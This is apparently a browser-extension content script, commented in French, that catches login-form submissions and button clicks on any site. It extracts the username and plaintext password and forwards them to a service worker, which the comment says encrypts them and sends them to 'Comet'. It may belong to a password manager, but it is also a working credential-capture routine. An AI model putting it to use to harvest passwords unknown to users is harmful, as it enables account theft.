// Détecte l'envoi d'un formulaire de connexion et transmet l'identifiant capturé
// au service worker (qui le chiffre puis l'envoie à Comet).

function findCreds(form) {
  const pw = form.querySelector('input[type="password"]');
  if (!pw || !pw.value) return null;
  let username = '';
  for (const inp of form.querySelectorAll('input')) {
    if (inp === pw) break;
    if (/^(text|email|tel)$/.test(inp.type) || inp.autocomplete === 'username' || inp.name === 'email') username = inp.value || username;
  }
  return { host: location.hostname, username, password: pw.value, url: location.origin + location.pathname };
}

function trySend(form) {
  try {
    if (!(form instanceof HTMLFormElement)) return;
    const creds = findCreds(form);
    if (creds && creds.password) chrome.runtime.sendMessage({ type: 'capture', data: creds });
  } catch {}
}

// Soumission classique (phase de capture pour devancer un preventDefault).
document.addEventListener('submit', (e) => trySend(e.target), true);

// Connexions sans <form> submit : bouton cliqué près d'un champ mot de passe.
document.addEventListener('click', (e) => {
  const btn = e.target.closest('button, input[type="submit"], [role="button"]');
  if (!btn) return;
  const form = btn.closest('form');
  if (form) trySend(form);
}, true);
